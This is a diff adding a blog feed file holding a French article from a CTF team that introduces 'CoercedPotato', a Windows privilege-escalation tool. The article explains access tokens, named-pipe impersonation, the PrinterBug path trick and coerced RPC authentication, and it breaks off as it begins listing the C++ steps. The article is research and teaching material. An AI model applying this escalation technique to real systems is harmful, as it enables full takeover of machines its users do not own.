@@ -1,0 +1,1774 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-09T17:26:19+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Blog Hackvens - CTF Orga &amp;amp; CTF Team</title><subtitle>Hackvens CTF Orga &amp; Team Writeups</subtitle><entry><title type="html">Coerced Potato</title><link href="http://localhost:4000/articles/CoercedPotato.html" rel="alternate" type="text/html" title="Coerced Potato" /><published>2023-10-09T00:00:00+02:00</published><updated>2023-10-09T00:00:00+02:00</updated><id>http://localhost:4000/articles/CoercedPotato</id><content type="html" xml:base="http://localhost:4000/articles/CoercedPotato.html">&lt;p&gt;&lt;strong&gt;CoercedPotato - Une patate de plus ! 🥔&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;table-des-matières&quot;&gt;Table des matières&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;#introduction&quot;&gt;&lt;strong&gt;1. Introduction&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;#une-histoire-de-privilèges&quot;&gt;&lt;strong&gt;2.&lt;/strong&gt; &lt;strong&gt;Une histoire de privilèges&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;#les-access-token-windows&quot;&gt;&lt;strong&gt;3.&lt;/strong&gt; &lt;strong&gt;Les Access Token Windows&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;#parlons-bien-parlons-named-pipe&quot;&gt;&lt;strong&gt;4.&lt;/strong&gt; &lt;strong&gt;Parlons bien, parlons « Named Pipe »&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;#un-peu-de-coercition-dauthentification&quot;&gt;&lt;strong&gt;5.&lt;/strong&gt; &lt;strong&gt;Un peu de Coercition d’authentification&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;#un-peu-de-code-maintenant-c-on-fire&quot;&gt;&lt;strong&gt;6.&lt;/strong&gt; &lt;strong&gt;Un peu de code maintenant (C++ on fire) !&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;#remerciements&quot;&gt;&lt;strong&gt;7.&lt;/strong&gt; &lt;strong&gt;Remerciements&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;Depuis 2016, de nombreux exploits nommés « Potatoes » ont été découverts
+et sont utilisés dans le but d’élever ses privilèges dans un système
+d’exploitation Windows. Le principe est toujours le même : passer d’un
+compte ayant les privilèges adéquats, souvent un compte de service, à
+&lt;strong&gt;NT AUTHORITY/SYSTEM&lt;/strong&gt; (le compte le plus privilégié sous
+Windows)&lt;strong&gt;&lt;em&gt;.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;L’objectif de cet article n’est pas de passer en revue la collection
+« Potatoes » disponible à ce jour. Pour cela, l’excellent article de
+@Blackwasp est disponible à l’URL suivant :
+&lt;a href=&quot;https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all.&quot;&gt;https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all.&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;En revanche, la combinaison de plusieurs concepts connus a permis la
+création d’un nouvel outil : « &lt;strong&gt;CoercedPotato&lt;/strong&gt; ». Cet outil permet
+notamment d’élever ses privilèges sur les versions les plus récentes de
+“Windows 10” et “Windows Server 2022”, à date de l’article.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image1.png&quot; style=&quot;width:6.3in;height:5.26389in; display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Notez que nous parlons de « nouvel outil » et non pas « nouvelle
+technique », dans la mesure où celui-ci concatène les connaissances
+actuelles concernant les &lt;strong&gt;impersonate token&lt;/strong&gt; et les méthodes
+permettant de forcer des authentifications via des &lt;strong&gt;fonctions RPC
+vulnérables&lt;/strong&gt;. Ces deux concepts seront expliqués au fur et à mesure de
+l’article.&lt;/p&gt;
+
+&lt;p&gt;Mais avant de commencer, il va falloir passer en revue plusieurs
+fondamentaux.&lt;/p&gt;
+
+&lt;h1 id=&quot;une-histoire-de-privilèges&quot;&gt;&lt;strong&gt;Une histoire de privilèges&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;« If you have SeAssignPrimaryToken or SeImpersonatePrivilege, you are
+SYSTEM ». C’est une citation issue d’un tweet (un X ?) de &lt;em&gt;@decoder_it&lt;/em&gt;
+qui n’est en somme pas très loin de la réalité.&lt;/p&gt;
+
+&lt;p&gt;Lors d’un test d’intrusion, et plus particulièrement en test d’intrusion
+interne, nous parvenons fréquemment à exécuter du code à distance. Dans
+le cas d’un système Windows, une fois une invite de commande obtenue sur
+la machine ciblée, nous nous retrouvons parfois dans la situation
+suivante : nous exécutons des commandes dans le contexte de sécurité de
+l’utilisateur &lt;strong&gt;NT AUTHORITY\LOCAL SERVICE&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image2.png&quot; style=&quot;width:3.88203in;height:0.98002in; display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police, ligne Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ce compte dispose de privilèges restreints sur le système. L’objectif
+est donc d’élever nos privilèges et d’obtenir une invite de commandes
+dans le contexte de l’utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;, afin de
+prendre le contrôle complet du système. Cela peut ensuite permettre de
+tenter de rebondir sur d’autres machines du réseau, en récupérant des
+identifiants en mémoires vives, en interagissant avec les &lt;em&gt;access
+tokens&lt;/em&gt; de Windows, en récupérant la base des utilisateurs
+locaux, etc. Mais… on s’égare ! 😊&lt;/p&gt;
+
+&lt;p&gt;Pour revenir au sujet initial, lorsque nous listons les privilèges de
+l’utilisateur &lt;strong&gt;NT AUTHORITY\LOCAL SERVICE&lt;/strong&gt;, celui-ci dispose
+normalement du privilège &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt; :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image3.png&quot; style=&quot;width:6.3in;height:1.77431in; display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;C’est ce privilège qui nous intéresse tout particulièrement pour la
+suite de l’article !&lt;/p&gt;
+
+&lt;p&gt;Si nous suivons la documentation officielle de Microsoft, ce privilège
+permet &lt;strong&gt;« &lt;em&gt;l’emprunt d’identité d’un client après l’authentification&lt;/em&gt;&lt;/strong&gt;
+&lt;em&gt;et la création de droits d’utilisateur &lt;strong&gt;d’objets globaux.&lt;/strong&gt;&lt;/em&gt; »&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege&quot;&gt;https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Concrètement, dans un environnement Windows, lorsqu’un utilisateur
+possède le privilège &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt;, il a la possibilité de
+démarrer des processus (c’est-à-dire des programmes, par exemple
+&lt;strong&gt;cmd.exe&lt;/strong&gt;) au nom d’un autre utilisateur. Cela se fait en appelant la
+fonction &lt;strong&gt;CreateProcessWithTokenW()&lt;/strong&gt; dans le contexte de sécurité de
+l’utilisateur.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw&quot;&gt;&lt;em&gt;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;A noter qu’il existe un privilège très similaire à
+&lt;strong&gt;SeImpersonatePrivilege &lt;/strong&gt;: &lt;strong&gt;SeAssignPrimaryToken&lt;/strong&gt;. Il permet
+également le démarrage d’un processus au nom d’un autre utilisateur avec
+la fonction &lt;strong&gt;CreateProcessAsUser()&lt;/strong&gt;, mais nous ne rentrerons pas dans
+les détails dans cet article.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://learn.microsoft.com/fr-fr/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasuserw&quot;&gt;https://learn.microsoft.com/fr-fr/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasuserw&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Toutes les techniques dites « &lt;strong&gt;Potatoes&lt;/strong&gt; » reposent sur ces privilèges
+(à l’exception de RemotePotato) pour obtenir des droits &lt;strong&gt;NT
+AUTHORITY\SYSTEM&lt;/strong&gt; (nous appellerons ça les droits &lt;strong&gt;SYSTEM&lt;/strong&gt; pour le
+reste de l’article) sur une machine Windows afin de la compromettre.
+Vous l’aurez compris, &lt;strong&gt;SeAssignPrimaryToken&lt;/strong&gt; et
+&lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt; sont des privilèges très précieux pour un
+attaquant et offrent (quasi) toujours la possibilité d’élever ses
+privilèges.&lt;/p&gt;
+
+&lt;p&gt;L’objectif de l’article est donc de montrer une nouvelle technique
+exploitant ces privilèges. Il est maintenant temps de rentrer dans le
+vif du sujet ! &lt;/p&gt;
+
+&lt;h1 id=&quot;les-accesstokenwindows&quot;&gt;&lt;strong&gt;Les Access Token Windows&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;En parcourant la documentation de Microsoft, il est possible de
+retrouver la définition des fonctions énoncées plus tôt :
+&lt;strong&gt;CreateProcessWithTokenW&lt;/strong&gt; et &lt;strong&gt;CreateProcessAsUserW&lt;/strong&gt;. La structure de
+ces fonctions est la suivante :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image4.png&quot; style=&quot;width:3.11927in;height:2.16522in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, nombre, Police Description générée automatiquement&quot; /&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image5.png&quot; style=&quot;width:2.90177in;height:2.13404in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police, nombre Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Il est intéressant de noter que ces deux fonctions nécessitent un
+&lt;strong&gt;access token&lt;/strong&gt; en argument pour être utilisées, et plus spécifiquement
+un &lt;strong&gt;primary token&lt;/strong&gt;. Mais qu’est-ce que c’est cette histoire de
+&lt;strong&gt;token&lt;/strong&gt; ?&lt;/p&gt;
+
+&lt;p&gt;Pour reprendre sa définition telle que décrite par Microsoft, les
+&lt;em&gt;&lt;strong&gt;access token&lt;/strong&gt; sont « des objets qui décrivent le contexte de
+sécurité d’un processus ou d’un thread.&lt;/em&gt; ».&lt;/p&gt;
+
+&lt;p&gt;Concrètement, l’&lt;strong&gt;access token&lt;/strong&gt;, ou jeton d’accès, est obtenu après une
+authentification réussie et contient un ensemble d’informations
+essentielles pour Windows, tel que l’identité de l’utilisateur, son
+groupe, sa liste de contrôle d’accès (ACL), ses privilèges et surtout,
+le type de token. Il pourrait par exemple être comparé à un jeton JWT
+utilisé par une application web.&lt;/p&gt;
+
+&lt;p&gt;Par exemple, si je démarre le processus &lt;strong&gt;cmd.exe&lt;/strong&gt; avec un &lt;strong&gt;access
+token&lt;/strong&gt; appartenant à l’utilisateur &lt;strong&gt;vagrant&lt;/strong&gt;, &lt;strong&gt;cmd.exe&lt;/strong&gt; aura les
+privilèges du compte &lt;strong&gt;vagrant&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/fr-fr/windows/win32/secauthz/access-tokens&quot;&gt;https://learn.microsoft.com/fr-fr/windows/win32/secauthz/access-tokens&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Il existe deux types d’&lt;strong&gt;access token&lt;/strong&gt; : les &lt;strong&gt;primary token&lt;/strong&gt; et les
+&lt;strong&gt;impersonation token&lt;/strong&gt;. Pour comprendre la différence entre ces deux
+types de jetons, il est nécessaire de connaître la différence entre un
+thread et un processus dans un système Windows.&lt;/p&gt;
+
+&lt;p&gt;Pour faire simple, un processus est un espace mémoire virtuel exécutant
+du code sur le système. Un thread correspond à du code exécuté depuis un
+processus. Il est donc temporaire et est détruit une fois terminé.&lt;/p&gt;
+
+&lt;p&gt;Pour imager, lorsque l’application Word est utilisée, le processus
+&lt;strong&gt;WINWORD.exe&lt;/strong&gt; est lancé sur la machine. Ce processus est démarré par
+l’utilisateur avec son &lt;strong&gt;primary token&lt;/strong&gt;. L’application va ensuite
+utiliser des threads, par exemple pour gérer des tâches en arrière-plan
+(affichage de l’interface graphique, traitement des entrées utilisateur,
+etc.). Cela permet une expérience fluide lors de l’utilisation de Word.
+Ces threads seront exécutés à l’aide d’un &lt;strong&gt;impersonation token&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/fr-fr/windows/win32/com/processes--threads--and-apartments&quot;&gt;https://learn.microsoft.com/fr-fr/windows/win32/com/processes--threads--and-apartments&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Maintenant que les bases sont acquises, revenons à nos moutons.&lt;/p&gt;
+
+&lt;p&gt;Comme expliqué précédemment, pour pouvoir démarrer un processus dans le
+contexte d’un utilisateur, il nous faut deux choses : le privilège
+adéquat (&lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt; ou &lt;strong&gt;SeAssignPrimaryToken&lt;/strong&gt;) et un
+&lt;strong&gt;primary token&lt;/strong&gt;. Bonne nouvelle pour nous, pour ce dernier prérequis,
+les deux types de jetons sont interchangeables grâce à la fonction
+&lt;strong&gt;DuplicateTokenEx&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex&quot;&gt;https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Ainsi, l’obtention d’un &lt;strong&gt;impersonation token&lt;/strong&gt; d’un utilisateur (au
+hasard, le compte &lt;strong&gt;SYSTEM&lt;/strong&gt;) permet, grâce à &lt;strong&gt;DuplicateTokenEx&lt;/strong&gt;,
+d’obtenir un &lt;strong&gt;primary token&lt;/strong&gt; et ainsi de créer un processus dans son
+contexte de sécurité (et donc avec son identité et surtout ses
+privilèges 😏).&lt;/p&gt;
+
+&lt;p&gt;C’est bien beau tout ça, mais une question (très ?) importante subsiste…
+Comment récupérer ce fameux &lt;strong&gt;access&lt;/strong&gt; &lt;strong&gt;token&lt;/strong&gt; ?&lt;/p&gt;
+
+&lt;h1 id=&quot;parlons-bien-parlons-named-pipe&quot;&gt;&lt;strong&gt;Parlons bien, parlons « Named Pipe »&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;Minute papillon ! Avant de pouvoir expliquer comment récupérer un
+&lt;strong&gt;access token&lt;/strong&gt;, il est nécessaire de repasser sur certaines bases
+(encore ? ). Promis, c’est la dernière fois !&lt;/p&gt;
+
+&lt;p&gt;Traditionnellement, les techniques « Potatoes » (Hot Potato, Sweet
+Potato, Local Potato, etc.) utilisent des fonctions RPC pour forcer
+l’utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; à s’authentifier sur un proxy
+local que l’attaquant contrôle, puis à relayer cette authentification
+jusqu’à récupérer un &lt;strong&gt;impersonation token&lt;/strong&gt; du compte &lt;strong&gt;SYSTEM&lt;/strong&gt;. Mais
+l’objectif de l’article n’est pas de revoir ces techniques bien connues
+!&lt;/p&gt;
+
+&lt;p&gt;Il existe en fait un autre moyen pour aboutir au même résultat :
+l’utilisation de « Named Pipe ».&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image6.jpg&quot; style=&quot;width:1.76563in;height:1.10352in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;René Magritte - Ceci n&amp;#39;est pas une pipe - Museum TV&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;D’après la documentation de Microsoft, un &lt;em&gt;« pipe est une section de
+mémoire partagée qui traite la communication entre un serveur pipe et un
+client. Le processus qui crée le pipe est un &lt;strong&gt;serveur&lt;/strong&gt;&lt;/em&gt; &lt;em&gt;&lt;strong&gt;pipe&lt;/strong&gt;. Un
+processus qui se connecte au pipe est &lt;strong&gt;un client&lt;/strong&gt;. Un processus écrit
+des informations dans le pipe, puis l’autre processus lit les
+informations du pipe. Cette vue d’ensemble décrit comment créer, gérer
+et utiliser des pipes.&lt;/em&gt; »&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/ipc/pipes&quot;&gt;https://learn.microsoft.com/en-us/windows/win32/ipc/pipes&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Pour résumer, les &lt;strong&gt;pipes&lt;/strong&gt; permettent l’échange de données
+inter-processus (IPC). Sous Windows, il existe deux types de &lt;em&gt;pipe&lt;/em&gt; :&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Anonymous pipe :&lt;/strong&gt; Les “Anonymous pipes” transfèrent les données
+entre un processus parent et un processus enfant.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Named pipe :&lt;/strong&gt; Les “Named pipes” transfèrent des données entre des
+processus qui n’ont pas de lien de parenté, à condition qu’il ait
+les privilèges appropriés pour interagir avec le processus.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Dans cet article ce qui nous intéresse, ce sont les &lt;strong&gt;named pipe&lt;/strong&gt;.
+Pourquoi ?&lt;/p&gt;
+
+&lt;p&gt;Parce qu’un processus ayant créé un serveur pipe peut utiliser une
+fonction très utile, surtout dans notre cas :
+&lt;strong&gt;ImpersonateNamedPipeClient()&lt;/strong&gt;. Cette fonction permet de nous placer
+dans le contexte de sécurité du client contactant le &lt;strong&gt;named pipe &lt;/strong&gt;! La
+principale condition pour pouvoir l’utiliser est de posséder le
+privilège &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt;… Parfait, c’est ce que nous allons
+utiliser ! 😊&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient&quot;&gt;https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Cette fonction permet au serveur pipe recevant une connexion entrante
+d’un client (par exemple d’un autre processus) d’emprunter l’identité du
+client pour effectuer des actions en son nom, dans son contexte de
+sécurité, en utilisant son &lt;strong&gt;access token&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Typiquement, dans l’exemple ci-dessous, nous créons un serveur pipe
+accessible via le Named Pipe &lt;strong&gt;\.\pipe\mynamedpipe&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image7.png&quot; style=&quot;width:5.72917in;height:0.31944in;display:block; margin-left:auto; margin-right:auto&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Puis, lorsqu’un utilisateur se connecte à ce serveur pipe, nous
+récupérons les informations liées à son &lt;strong&gt;access token&lt;/strong&gt;. Dans l’exemple
+ci-dessous, nous nous connectons au serveur pipe avec l’utilisateur
+&lt;strong&gt;lab\advens&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image8.png&quot; style=&quot;width:6.3in;height:3.51944in;display:block; margin-left:auto; margin-right:auto&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Donc, pour résumer, si nous disposons les privilèges requis et parvenons
+à forcer l’utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; à s’authentifier sur un
+&lt;strong&gt;serveur&lt;/strong&gt; &lt;strong&gt;pipe&lt;/strong&gt; que nous contrôlons, nous sommes en mesure
+d’exécuter des processus en son nom, et donc du code (c’est pas beau ça
+? 😊).&lt;/p&gt;
+
+&lt;p&gt;Concrètement, c’est exactement ce qu’a expliqué @Itm4n dans son blog. En
+utilisant la vulnérabilité &lt;strong&gt;PrinterBug&lt;/strong&gt;, l’outil &lt;strong&gt;PrintSpoofer&lt;/strong&gt;
+permet d’élever ses privilèges et obtenir des droits &lt;strong&gt;NT
+AUTHORITY\SYSTEM&lt;/strong&gt; à partir d’un compte disposant notamment du privilège
+&lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Pour ne pas simplement paraphraser son article passionnant, je vous
+invite à le lire si vous n’êtes pas particulièrement familier avec
+l’outil &lt;strong&gt;PrintSpoofer&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/#getting-a-system-token&quot;&gt;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Le &lt;strong&gt;PrinterBug&lt;/strong&gt; exploite une « fonctionnalité » implémentée dans
+l’interface RPC MS-RPRN en appelant la procédure RPC
+&lt;strong&gt;RpcRemoteFindFirstPrinterChangeNotificationEx&lt;/strong&gt;, qui permet d’envoyer
+une notification d’impression à un serveur d’impression. Pour mieux
+comprendre, cette fonction RPC peut être détournée pour forcer une
+machine à s’authentifier où l’on veut, simplement en indiquant un chemin
+vers un (faux) serveur d’impression (situé sur un Named Pipe par
+exemple), ce qui peut être utile dans le cadre d’autres exploits (&lt;a href=&quot;mailto:https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976&quot;&gt;Voir
+cet
+article&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;Néanmoins, ce qui nous intéresse ici, c’est le bug utilisé après
+exploitation de la vulnérabilité &lt;strong&gt;PrinterBug&lt;/strong&gt;. Celui-ci réside dans un
+problème d’interprétation des « / » par le système Windows. Je
+m’explique :&lt;/p&gt;
+
+&lt;p&gt;Lorsque la procédure RPC
+&lt;strong&gt;RpcRemoteFindFirstPrinterChangeNotificationEx&lt;/strong&gt; est appelée, le
+processus &lt;strong&gt;spoolsv.exe&lt;/strong&gt;, qui est démarré dans le contexte de sécurité
+de l’utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;, vérifie le chemin spécifié par
+l’utilisateur. Si le named pipe indiqué n’est pas de la forme
+&lt;strong&gt;\somewhere\pipe\spoolss&lt;/strong&gt;, une erreur est renvoyée, sinon, il tente
+de s’y connecter.&lt;/p&gt;
+
+&lt;p&gt;Par défaut, il n’est pas possible de créer un named pipe déjà existant,
+donc pas possible d’écouter sur &lt;strong&gt;\localhost\pipe\spoolss&lt;/strong&gt; ! En
+revanche, lorsque le chemin spécifié est de la forme
+&lt;strong&gt;\somewhere/pipe/controlled&lt;/strong&gt;, alors le chemin spécifié est considéré
+comme valide (oui) et il est finalement corrigé par le système qui
+ajoute &lt;strong&gt;\pipe\spoolss&lt;/strong&gt; à la fin. Par conséquent, une connexion est
+effectuée sur &lt;strong&gt;\somewhere\pipe\controlled\pipe\spoolss&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Dans le cadre de &lt;strong&gt;Printspoofer&lt;/strong&gt;, la connexion effectuée via le
+processus &lt;strong&gt;spoolsv.exe&lt;/strong&gt;, donc dans le contexte de sécurité du compte
+&lt;strong&gt;NT AUTHORIY\SYSTEM&lt;/strong&gt;, se fait localement sur
+&lt;strong&gt;\localhost\pipe\controlled\pipe\spoolss&lt;/strong&gt;. Bingo ! C’est un named
+pipe sur lequel il est possible d’écouter.&lt;/p&gt;
+
+&lt;p&gt;Pour résumer, grâce à ce bug, il est possible de récupérer un &lt;strong&gt;access
+token&lt;/strong&gt; associé au compte &lt;strong&gt;NT AUTHORITY\SYSTEM,&lt;/strong&gt; via une connexion sur
+un Named Pipe que nous contrôlons. Dès lors, il est possible de démarrer
+un cmd.exe avec les privilèges &lt;strong&gt;SYSTEM&lt;/strong&gt; !&lt;/p&gt;
+
+&lt;p&gt;Mais que se passerait-il si le spooler d’impression Windows n’est pas
+activé sur la machine ? &lt;/p&gt;
+
+&lt;p&gt;C’est là qu’interviennent des techniques de coercition
+d’authentification plus récemment découvertes et notre outil :
+&lt;strong&gt;CoercedPotato&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;un-peu-de-coercition-dauthentification&quot;&gt;&lt;strong&gt;Un peu de Coercition d’authentification&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;En 2021, la vulnérabilité PetitPotam a permis de dévoiler au grand jour
+la possibilité de forcer une machine à s’authentifier n’importe où sur
+le réseau, notamment via la fonction RPC &lt;strong&gt;EfsRpcOpenFileRaw&lt;/strong&gt;
+implémentée par l’interface RPC &lt;strong&gt;MS-EFSRPC&lt;/strong&gt;. Cette fonction permet
+l’ouverture d’un objet chiffré sur un serveur, afin d’effectuer une
+sauvegarde ou de la restaurer.&lt;/p&gt;
+
+&lt;p&gt;Dans le courant de l’année 2022, le travail de P0dalirius a 
+montré qu’il existe une multitude de fonctions RPC pouvant être
+exploitées pour forcer des authentifications grâce à son outil Coercer
+(&lt;a href=&quot;https://github.com/p0dalirius/Coercer&quot;&gt;https://github.com/p0dalirius/Coercer&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;De plus, de nombreuses méthodes n’ont pas encore été testées, mais
+pourraient être exploitées pour forcer une authentification :
+&lt;a href=&quot;https://github.com/p0dalirius/windows-coerced-authentication-methods&quot;&gt;https://github.com/p0dalirius/windows-coerced-authentication-methods&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;L’idée nous est donc venue de la combinaison des techniques utilisées
+par l’outil PrintSpoofer associées aux fonctions RPC vulnérables
+remontées par @P0dalirius.&lt;/p&gt;
+
+&lt;p&gt;Notre outil a ainsi pour vocation de regrouper toutes les méthodes de
+coercition en local permettant une élévation de privilèges à partir des
+privilèges &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt; et &lt;strong&gt;SeAssignPrimaryToken&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;un-peu-de-code-maintenant-c-on-fire&quot;&gt;&lt;strong&gt;Un peu de code maintenant (C++ on fire) !&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;En combinant les concepts expliqués précédemment, nous avons donc créé
+l’outil CoercedPotato qui exploite le privilège
+&lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt; ou &lt;strong&gt;SeAssignPrimaryToken&lt;/strong&gt; pour compromettre
+une machine Windows.&lt;/p&gt;
+
+&lt;p&gt;Rentrons dans le dur maintenant ! &lt;/p&gt;
+
+&lt;h2 id=&quot;ouverture-dun-serveur-pipe&quot;&gt;Ouverture d’un serveur pipe&lt;/h2&gt;
+
+&lt;p&gt;La première étape consiste à lancer un serveur pipe qui attend une
+connexion sur un &lt;strong&gt;named pipe.&lt;/strong&gt; L’objectif est de récupérer une
+connexion du compte &lt;strong&gt;SYSTEM&lt;/strong&gt;, donc son &lt;strong&gt;access token&lt;/strong&gt;, et d’exécuter
+du code en son nom.&lt;/p&gt;
+
+&lt;p&gt;Pour ce faire, dans un nouveau thread, nous lançons les fonctions
+suivantes :&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;CreateNamedPipe&lt;/strong&gt;() – Création d’un serveur pipe en écoute sur le
+&lt;strong&gt;named pipe&lt;/strong&gt; donné en paramètre. En fonction des appels RPC que
+nous ferons par la suite, nous écoutons sur un named pipe spécifique
+(par exemple : &lt;strong&gt;\.\pipe\coerced\pipe\srvsvc&lt;/strong&gt;).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;CreateNamedPipe&lt;/strong&gt;(lpName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE |
+PIPE_WAIT, 10, 2048, 2048, 0, &amp;amp;sa)&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;ConnectNamedPipe()&lt;/strong&gt; – Mise du serveur pipe en attente d’une
